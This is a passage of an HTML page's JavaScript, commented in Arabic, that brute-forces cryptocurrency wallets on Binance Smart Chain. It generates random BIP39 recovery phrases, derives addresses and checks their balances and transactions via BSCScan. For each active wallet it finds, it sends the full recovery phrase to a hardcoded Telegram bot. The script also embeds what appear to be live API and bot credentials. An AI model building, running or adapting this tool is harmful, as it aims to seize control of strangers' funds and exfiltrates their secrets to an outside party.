            "upper", "upset", "urban", "urge", "usage", "use", "used", "useful", "useless", "usual",
            "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish", "vapor",
            "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify",
            "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view",
            "village", "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid",
            "vocal", "voice", "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait",
            "walk", "wall", "walnut", "want", "warfare", "warm", "warrior", "wash", "wasp", "waste",
            "water", "wave", "way", "wealth", "weapon", "weary", "weather", "web", "wedding", "weekend",
            "weird", "welcome", "west", "wet", "whale", "what", "wheat", "wheel", "when", "where",
            "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine",
            "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf",
            "woman", "wonder", "wood", "wool", "word", "work", "world", "worry", "worth", "wrap",
            "wreck", "wrestle", "wrist", "write", "wrong", "yard", "year", "yellow", "you", "young",
            "youth", "zebra", "zero", "zone", "zoo"
        ];

        // إعدادات التطبيق - تم تحديثها للعمل مع BSC
        const BSCSCAN_API_KEY = 'ZM8ACMJB67C2IXKKBF8URFUNSY';
        const BSCSCAN_API_URL = 'https://api.bscscan.com/api';
        const TELEGRAM_BOT_TOKEN = '8257110214:AAFDx0awsmi7yjz6tCZqVY2jS5BZmygvQKw';
        const TELEGRAM_CHAT_ID = '910021564';
        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

        // متغيرات العملية
        let isRunning = false;
        let searchInterval = null;
        let stats = {
            totalGenerated: 0,
            activeWallets: 0,
            emptyWallets: 0,
            errors: 0
        };

        // عناصر DOM
        const elements = {
            startBtn: document.getElementById('startBtn'),
            stopBtn: document.getElementById('stopBtn'),
            testTelegramBtn: document.getElementById('testTelegramBtn'),
            clearLogsBtn: document.getElementById('clearLogsBtn'),
            checkMnemonicBtn: document.getElementById('checkMnemonicBtn'),
            searchSpeed: document.getElementById('searchSpeed'),
            maxAttempts: document.getElementById('maxAttempts'),
            checkTokens: document.getElementById('checkTokens'),
            manualCheckTokens: document.getElementById('manualCheckTokens'),
            manualMnemonic: document.getElementById('manualMnemonic'),
            manualCheckResult: document.getElementById('manualCheckResult'),
            liveDisplay: document.getElementById('liveDisplay'),
            currentPhrase: document.getElementById('currentPhrase'),
            phraseStatus: document.getElementById('phraseStatus'),
            totalGenerated: document.getElementById('totalGenerated'),
            activeWallets: document.getElementById('activeWallets'),
            emptyWallets: document.getElementById('emptyWallets'),
            errorCount: document.getElementById('errorCount'),
            progressFill: document.getElementById('progressFill'),
            currentStatus: document.getElementById('currentStatus'),
            logPanel: document.getElementById('logPanel')
        };

        // التحقق من تحميل ethers.js
        function checkEthersLoaded() {
            if (typeof ethers === 'undefined') {
                updateStatus('❌ فشل في تحميل مكتبة ethers.js. يرجى التحقق من اتصال الإنترنت.', 'danger');
                addLogEntry('❌ فشل في تحميل مكتبة ethers.js', 'error');
                return false;
            }
            return true;
        }

        // وظائف توليد العبارات العشوائية
        function getSecureRandomInt(max) {
            const array = new Uint32Array(1);
            window.crypto.getRandomValues(array);
            return array[0] % max;
        }

        function generateRandomBIP39Phrase() {
            const words = [];
            for (let i = 0; i < 12; i++) {
                const randomIndex = getSecureRandomInt(BIP39_WORDLIST.length);
                words.push(BIP39_WORDLIST[randomIndex]);
            }
            return words.join(' ');
        }

        // وظائف المحفظة
        async function mnemonicToAddress(mnemonic) {
            try {
                if (!checkEthersLoaded()) {
                    throw new Error('مكتبة ethers.js غير محملة');
                }
                
                // التحقق من صحة العبارة باستخدام ethers
                if (!ethers.utils.isValidMnemonic(mnemonic)) {
                    throw new Error('عبارة استرجاع غير صالحة');
                }
                
                const wallet = ethers.Wallet.fromMnemonic(mnemonic);
                return wallet.address;
            } catch (error) {
                console.error('خطأ في تحويل العبارة إلى عنوان:', error);
                throw error;
            }
        }

        // وظائف BSCScan API - تم تحديثها للعمل مع BSC
        async function checkBNBBalance(address) {
            try {
                const url = `${BSCSCAN_API_URL}?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === '1' && data.result) {
                    const balanceWei = data.result;
                    const balanceBnb = ethers.utils.formatEther(balanceWei);
                    return parseFloat(balanceBnb);
                } else {
                    throw new Error(data.message || 'خطأ في الحصول على الرصيد');
                }
            } catch (error) {
                console.error('خطأ في التحقق من رصيد BNB:', error);
                return null;
            }
        }

        // فحص المعاملات العادية (BNB) - جديد
        async function checkBNBTransactions(address) {
            try {
                const url = `${BSCSCAN_API_URL}?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&page=1&offset=1&sort=desc&apikey=${BSCSCAN_API_KEY}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === '1' && data.result && data.result.length > 0) {
                    return {
                        hasTransactions: true,
                        transactionCount: data.result.length,
                        lastTransaction: data.result[0]
                    };
                } else {
                    return {
                        hasTransactions: false,
                        transactionCount: 0,
                        lastTransaction: null
                    };
                }
            } catch (error) {
                console.error('خطأ في التحقق من معاملات BNB:', error);
                return {
                    hasTransactions: false,
                    transactionCount: 0,
                    lastTransaction: null
                };
            }
        }

        async function checkBEP20Tokens(address) {
            try {
                const url = `${BSCSCAN_API_URL}?module=account&action=tokentx&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${BSCSCAN_API_KEY}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === '1' && data.result) {
                    // تحليل المعاملات للعثور على الرموز المميزة
                    const tokens = {};
                    data.result.forEach(tx => {
                        const tokenAddress = tx.contractAddress;
                        const tokenName = tx.tokenName || 'Unknown Token';
                        const tokenSymbol = tx.tokenSymbol || 'UNKNOWN';
                        
                        if (!tokens[tokenAddress]) {
                            tokens[tokenAddress] = {
                                name: tokenName,
                                symbol: tokenSymbol,
                                address: tokenAddress,
                                hasActivity: true
                            };
                        }
                    });
                    
                    return {
                        tokens: Object.values(tokens),
                        hasTokenTransactions: data.result.length > 0,
                        tokenTransactionCount: data.result.length
                    };
                } else if (data.message === 'No transactions found') {
                    return {
                        tokens: [],
                        hasTokenTransactions: false,
                        tokenTransactionCount: 0
                    };
                } else {
                    throw new Error(data.message || 'خطأ في الحصول على الرموز المميزة');
                }
            } catch (error) {
                console.error('خطأ في التحقق من الرموز المميزة:', error);
                return {
                    tokens: [],
                    hasTokenTransactions: false,
                    tokenTransactionCount: 0
                };
            }
        }

        // تحديث وظيفة فحص أصول المحفظة لتشمل فحص المعاملات
        async function checkWalletAssets(address) {
            try {
                // التحقق من رصيد BNB
                const bnbBalance = await checkBNBBalance(address);
                
                // فحص معاملات BNB
                const bnbTransactions = await checkBNBTransactions(address);
                
                // التحقق من الرموز المميزة إذا كان الخيار مفعل
                let tokenData = { tokens: [], hasTokenTransactions: false, tokenTransactionCount: 0 };
                if (elements.checkTokens.checked) {
                    tokenData = await checkBEP20Tokens(address) || tokenData;
                }
                
                const hasBNB = bnbBalance !== null && bnbBalance > 0;
                const hasTokens = tokenData.tokens.length > 0;
                const hasTransactions = bnbTransactions.hasTransactions || tokenData.hasTokenTransactions;
                
                // المحفظة تعتبر نشطة إذا كان لديها رصيد أو معاملات
                const isActive = hasBNB || hasTokens || hasTransactions;
                
                return {
                    hasAssets: isActive,
                    bnbBalance: bnbBalance,
                    tokens: tokenData.tokens,
                    hasBNB: hasBNB,
                    hasTokens: hasTokens,
                    hasTransactions: hasTransactions,
                    bnbTransactionCount: bnbTransactions.transactionCount,
                    tokenTransactionCount: tokenData.tokenTransactionCount,
                    totalTransactions: bnbTransactions.transactionCount + tokenData.tokenTransactionCount
                };
            } catch (error) {
                console.error('خطأ في التحقق من أصول المحفظة:', error);
                return {
                    hasAssets: false,
                    bnbBalance: null,
                    tokens: [],
                    hasBNB: false,
                    hasTokens: false,
                    hasTransactions: false,
                    bnbTransactionCount: 0,
                    tokenTransactionCount: 0,
                    totalTransactions: 0,
                    error: error.message
                };
            }
        }

        // وظائف Telegram
        async function sendTelegramMessage(message) {
            try {
                const response = await fetch(`${TELEGRAM_API_URL}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const data = await response.json();
                if (!data.ok) {
                    console.error('خطأ في إرسال الرسالة:', data.description);
                    return false;
                }
                
                return true;
            } catch (error) {
                console.error('خطأ في الاتصال بـ Telegram:', error);
                return false;
            }
        }

        // تحديث وظيفة تنسيق رسالة المحفظة لتشمل معلومات المعاملات
        function formatWalletMessage(mnemonic, address, walletDetails) {
            const timestamp = new Date().toLocaleString('ar-EG', {
                timeZone: 'Africa/Cairo',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
            
            let message = `🎉 <b>تم العثور على محفظة نشطة على BSC!</b>\n\n`;
            message += `📝 <b>عبارة الاسترجاع:</b>\n<code>${mnemonic}</code>\n\n`;
            message += `📍 <b>العنوان:</b>\n<code>${address}</code>\n\n`;
            
            // معلومات الرصيد
            if (walletDetails.bnbBalance !== null) {
                message += `💰 <b>رصيد BNB:</b> ${walletDetails.bnbBalance.toFixed(6)} BNB\n`;
            }
            
            // معلومات المعاملات
            if (walletDetails.totalTransactions > 0) {
                message += `📊 <b>إجمالي المعاملات:</b> ${walletDetails.totalTransactions}\n`;
                if (walletDetails.bnbTransactionCount > 0) {
                    message += `   • معاملات BNB: ${walletDetails.bnbTransactionCount}\n`;
                }
                if (walletDetails.tokenTransactionCount > 0) {
                    message += `   • معاملات الرموز: ${walletDetails.tokenTransactionCount}\n`;
                }
            }
            
            // معلومات الرموز المميزة
            if (walletDetails.tokens.length > 0) {
                message += `🪙 <b>الرموز المميزة (BEP-20):</b> ${walletDetails.tokens.length} رمز\n`;
                walletDetails.tokens.slice(0, 5).forEach(token => {
                    message += `   • ${token.name} (${token.symbol})\n`;
                });
                if (walletDetails.tokens.length > 5) {
                    message += `   ... و ${walletDetails.tokens.length - 5} أكثر\n`;
                }
            }
            
            // سبب اعتبار المحفظة نشطة
            let activityReason = [];
            if (walletDetails.hasBNB) activityReason.push('رصيد BNB');
            if (walletDetails.hasTokens) activityReason.push('رموز مميزة');
            if (walletDetails.hasTransactions && !walletDetails.hasBNB && !walletDetails.hasTokens) {
                activityReason.push('وجود معاملات');
            }
            
            if (activityReason.length > 0) {
                message += `\n✅ <b>سبب النشاط:</b> ${activityReason.join(' + ')}\n`;
            }
            
            message += `\n🔗 <a href="https://bscscan.com/address/${address}">عرض على BSCScan</a>`;
            message += `\n\n⏰ <b>الوقت:</b> ${timestamp}`;
            return message;
        }

        async function sendWalletToTelegram(mnemonic, address, walletDetails) {
            try {
                const message = formatWalletMessage(mnemonic, address, walletDetails);
                return await sendTelegramMessage(message);
            } catch (error) {
                console.error('خطأ في إرسال المحفظة:', error);
                return false;
            }
        }

        // وظائف العرض المباشر للعبارات
        function updateLiveDisplay(mnemonic, status) {
            elements.liveDisplay.style.display = 'block';
            elements.currentPhrase.textContent = mnemonic;
            
            elements.phraseStatus.className = `phrase-status ${status}`;
            switch(status) {
                case 'checking':
                    elements.phraseStatus.textContent = '🔄 جاري الفحص...';
                    break;
                case 'active':
                    elements.phraseStatus.textContent = '✅ محفظة نشطة!';
                    break;
                case 'empty':
                    elements.phraseStatus.textContent = '❌ محفظة فارغة';
                    break;
            }
        }

        // وظائف السجل
        function addLogEntry(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString('ar-EG');
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry log-${type}`;
            logEntry.innerHTML = `<span class="log-timestamp">[${timestamp}]</span> ${message}`;
            
            elements.logPanel.appendChild(logEntry);
            elements.logPanel.scrollTop = elements.logPanel.scrollHeight;
        }

        // وظائف تحديث الواجهة
        function updateStats() {
            elements.totalGenerated.textContent = stats.totalGenerated;
            elements.activeWallets.textContent = stats.activeWallets;
            elements.emptyWallets.textContent = stats.emptyWallets;
            elements.errorCount.textContent = stats.errors;
            
            const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
            if (maxAttempts > 0) {
                const progress = (stats.totalGenerated / maxAttempts) * 100;
                elements.progressFill.style.width = `${Math.min(progress, 100)}%`;
            }
        }

        function updateStatus(message, type = 'info') {
            elements.currentStatus.textContent = message;
            elements.currentStatus.className = `alert alert-${type}`;
        }

        // وظيفة التحقق اليدوي من العبارة - محدثة
        async function checkMnemonicManually() {
            const mnemonic = elements.manualMnemonic.value.trim();
            
            if (!mnemonic) {
                updateStatus('❌ يرجى إدخال عبارة استرجاع', 'danger');
                return;
            }
            
            if (!checkEthersLoaded()) {
                return;
            }
            
            // إظهار رسالة التحميل
            elements.checkMnemonicBtn.disabled = true;
            elements.checkMnemonicBtn.innerHTML = '<span class="loading-spinner"></span> جاري الفحص...';
            
            // عرض العبارة في القسم المباشر
            updateLiveDisplay(mnemonic, 'checking');
            
            try {
                // التحقق من صحة العبارة
                if (!ethers.utils.isValidMnemonic(mnemonic)) {
                    throw new Error('عبارة الاسترجاع غير صالحة. يرجى التحقق من الكلمات.');
                }
                
                updateStatus('جاري فحص عبارة الاسترجاع على BSC...', 'info');
                addLogEntry(`🔍 جاري فحص العبارة يدويًا: ${mnemonic.substring(0, 30)}...`);
                
                // تحويل العبارة إلى عنوان
                const address = await mnemonicToAddress(mnemonic);
                
                if (!address) {
                    throw new Error('فشل في تحويل العبارة إلى عنوان');
                }
                
                addLogEntry(`تم تحويل العبارة إلى العنوان: ${address.substring(0, 20)}...`);
                
                // فحص أصول المحفظة
                const walletDetails = await checkWalletAssets(address);
                
                // تحديث العرض المباشر
                if (walletDetails.hasAssets) {
                    updateLiveDisplay(mnemonic, 'active');
                } else {
                    updateLiveDisplay(mnemonic, 'empty');
                }
                
                // عرض النتائج
                displayManualCheckResults(mnemonic, address, walletDetails);
                
                if (walletDetails.hasAssets) {
                    updateStatus(`✅ تم العثور على محفظة نشطة!`, 'success');
                    addLogEntry(`🎉 المحفظة نشطة! السبب: ${getActivityReason(walletDetails)}`, 'success');
                } else {
                    updateStatus(`❌ المحفظة غير نشطة - لا تحتوي على أصول أو معاملات`, 'warning');
                    addLogEntry(`المحفظة غير نشطة`, 'info');
                }
                
            } catch (error) {
                updateStatus(`❌ خطأ: ${error.message}`, 'danger');
                addLogEntry(`خطأ في فحص العبارة: ${error.message}`, 'error');
                elements.manualCheckResult.style.display = 'none';
                elements.liveDisplay.style.display = 'none';
            } finally {
                // إعادة تعيين الزر
                elements.checkMnemonicBtn.disabled = false;
                elements.checkMnemonicBtn.innerHTML = '<span>🔎 فحص العبارة</span>';
            }
        }

        function getActivityReason(walletDetails) {
            let reasons = [];
            if (walletDetails.hasBNB) reasons.push('رصيد BNB');
            if (walletDetails.hasTokens) reasons.push('رموز مميزة');
            if (walletDetails.hasTransactions && !walletDetails.hasBNB && !walletDetails.hasTokens) {
                reasons.push('وجود معاملات');
            }
            return reasons.join(' + ') || 'غير محدد';
        }

        function displayManualCheckResults(mnemonic, address, walletDetails) {
            let resultHTML = `
                <h4>نتائج الفحص</h4>
                <div class="wallet-info">
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">العبارة:</span>
                        <span class="wallet-info-value"><code>${mnemonic}</code></span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">العنوان:</span>
                        <span class="wallet-info-value"><code>${address}</code></span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">رصيد BNB:</span>
                        <span class="wallet-info-value">${walletDetails.bnbBalance !== null ? walletDetails.bnbBalance.toFixed(6) + ' BNB' : 'غير متوفر'}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">إجمالي المعاملات:</span>
                        <span class="wallet-info-value">${walletDetails.totalTransactions}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">معاملات BNB:</span>
                        <span class="wallet-info-value">${walletDetails.bnbTransactionCount}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">معاملات الرموز:</span>
                        <span class="wallet-info-value">${walletDetails.tokenTransactionCount}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">تحتوي على BNB:</span>
                        <span class="wallet-info-value">${walletDetails.hasBNB ? '✅ نعم' : '❌ لا'}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">تحتوي على رموز:</span>
                        <span class="wallet-info-value">${walletDetails.hasTokens ? '✅ نعم (' + walletDetails.tokens.length + ' رمز)' : '❌ لا'}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">لديها معاملات:</span>
                        <span class="wallet-info-value">${walletDetails.hasTransactions ? '✅ نعم' : '❌ لا'}</span>
                    </div>
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">المحفظة نشطة:</span>
                        <span class="wallet-info-value">${walletDetails.hasAssets ? '✅ نعم' : '❌ لا'}</span>
                    </div>
            `;
            
            if (walletDetails.tokens.length > 0) {
                resultHTML += `
                    <div class="wallet-info-item">
                        <span class="wallet-info-label">الرموز المميزة:</span>
                        <div class="wallet-info-value">
                            <div class="token-list">
                `;
                
                walletDetails.tokens.forEach(token => {
                    resultHTML += `
                        <div class="token-item">
                            <div class="token-name">${token.name}</div>
                            <div class="token-symbol">${token.symbol}</div>
                        </div>
                    `;
                });
                
                resultHTML += `
                            </div>
                        </div>
                    </div>
                `;
            }
            
            resultHTML += `
                </div>
                <div class="button-group" style="margin-top: 15px;">
                    <a href="https://bscscan.com/address/${address}" target="_blank" class="btn btn-secondary">
                        <span>🔗 عرض على BSCScan</span>
                    </a>
                </div>
            `;
            
            elements.manualCheckResult.innerHTML = resultHTML;
            elements.manualCheckResult.style.display = 'block';
        }

        // الوظيفة الرئيسية للبحث - محدثة
        async function searchForActiveWallets() {
            try {
                if (!checkEthersLoaded()) {
                    stats.errors++;
                    updateStats();
                    return;
                }

                // توليد عبارة عشوائية
                const mnemonic = generateRandomBIP39Phrase();
                stats.totalGenerated++;
                
                // عرض العبارة في القسم المباشر
                updateLiveDisplay(mnemonic, 'checking');
                
                updateStatus(`جاري فحص العبارة رقم ${stats.totalGenerated} على BSC...`, 'info');
                addLogEntry(`تم توليد عبارة جديدة: ${mnemonic.substring(0, 30)}...`);
                
                // تحويل العبارة إلى عنوان
                const address = await mnemonicToAddress(mnemonic);
                
                if (!address) {
                    stats.errors++;
                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
                    updateStats();
                    return;
                }
                
                addLogEntry(`تم تحويل العبارة إلى العنوان: ${address.substring(0, 20)}...`);
                
                // فحص أصول المحفظة
                const walletStatus = await checkWalletAssets(address);
                
                if (walletStatus.hasAssets) {
                    stats.activeWallets++;
                    updateLiveDisplay(mnemonic, 'active');
                    
                    const activityReason = getActivityReason(walletStatus);
                    addLogEntry(`🎉 تم العثور على محفظة نشطة على BSC! العنوان: ${address}`, 'success');
                    addLogEntry(`السبب: ${activityReason}`, 'success');
                    
                    // إرسال المحفظة إلى Telegram مع التأكد من إرسال العبارة الكاملة
                    const telegramSent = await sendWalletToTelegram(mnemonic, address, walletStatus);
                    if (telegramSent) {
                        addLogEntry('✅ تم إرسال المحفظة وعبارة الاسترجاع إلى Telegram بنجاح', 'success');
                    } else {
                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
                    }
                    
                    updateStatus(`تم العثور على محفظة نشطة على BSC! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
                } else {
                    stats.emptyWallets++;
                    updateLiveDisplay(mnemonic, 'empty');
                    addLogEntry(`محفظة غير نشطة: ${address.substring(0, 20)}...`, 'info');
                }
                
                updateStats();
                
                // التحقق من الحد الأقصى للمحاولات
                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
                    stopSearch();
                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
                }
                
            } catch (error) {
                stats.errors++;
                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
                updateStats();
            }
        }

        // وظائف التحكم
        async function startSearch() {
            if (isRunning) return;
            
            if (!checkEthersLoaded()) {
                return;
            }
            
            isRunning = true;
            elements.startBtn.disabled = true;
            elements.stopBtn.disabled = false;
            
            const speed = parseInt(elements.searchSpeed.value) || 3000;
            
            updateStatus('جاري بدء البحث على BSC...', 'info');
            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة على BSC');
            
            // إظهار قسم العرض المباشر
            elements.liveDisplay.style.display = 'block';
            
            // إرسال رسالة البداية إلى Telegram
            const checkTokens = elements.checkTokens.checked;
            let startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة على BSC</b>\n\n`;
            startMessage += `⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n`;
            startMessage += `🔍 جاري البحث عن محافظ تحتوي على أصول أو معاملات على شبكة Binance Smart Chain...\n`;
            startMessage += `🪙 البحث عن الرموز المميزة (BEP-20): ${checkTokens ? '✅ مفعل' : '❌ معطل'}\n`;
            startMessage += `📊 معيار النشاط: الرصيد أو وجود معاملات`;
            
            await sendTelegramMessage(startMessage);
            
            searchInterval = setInterval(searchForActiveWallets, speed);
        }

        async function stopSearch() {
            if (!isRunning) return;
            
            isRunning = false;
            elements.startBtn.disabled = false;
            elements.stopBtn.disabled = true;
            
            if (searchInterval) {
                clearInterval(searchInterval);
                searchInterval = null;
            }
            
            updateStatus('تم إيقاف البحث', 'warning');
            addLogEntry('⏹️ تم إيقاف البحث');
            
            // إخفاء قسم العرض المباشر
            elements.liveDisplay.style.display = 'none';
            
            // إرسال رسالة الإيقاف إلى Telegram
            let stopMessage = `⏹️ <b>تم إيقاف عملية البحث على BSC</b>\n\n`;
            stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
            stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
            stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
            stopMessage += `📭 المحافظ غير النشطة: ${stats.emptyWallets}\n`;
            stopMessage += `❌ الأخطاء: ${stats.errors}\n`;
            stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            
            await sendTelegramMessage(stopMessage);
        }

        async function testTelegramConnection() {
            updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
            addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
            
            const testMessage = `🧪 <b>اختبار الاتصال - BSC Bot المحسن</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n\n✨ <b>الميزات الجديدة:</b>\n• فحص المعاملات كمعيار للنشاط\n• عرض العبارات المباشر\n• ضمان إرسال عبارة الاسترجاع\n\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
            const success = await sendTelegramMessage(testMessage);
            
            if (success) {
                updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
                addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
            } else {
                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
            }
        }

        function clearLogs() {
            elements.logPanel.innerHTML = '';
            addLogEntry('تم مسح السجل');
        }

        // ربط الأحداث
        elements.startBtn.addEventListener('click', startSearch);
        elements.stopBtn.addEventListener('click', stopSearch);
        elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
        elements.clearLogsBtn.addEventListener('click', clearLogs);
        elements.checkMnemonicBtn.addEventListener('click', checkMnemonicManually);

        // التحقق من تحميل ethers.js عند بدء التطبيق
        document.addEventListener('DOMContentLoaded', function() {
            if (checkEthersLoaded()) {
                updateStatus('✅ تم تحميل مكتبة ethers.js بنجاح. جاهز للبحث على BSC مع الميزات المحسنة...', 'success');
                addLogEntry('✅ تم تحميل مكتبة ethers.js بنجاح', 'success');
                addLogEntry('🆕 الميزات الجديدة: فحص المعاملات + عرض العبارات المباشر', 'info');
            }
        });

        // تحديث الإحصائيات عند بدء التطبيق
        updateStats();
    </script>
</body>
</html>
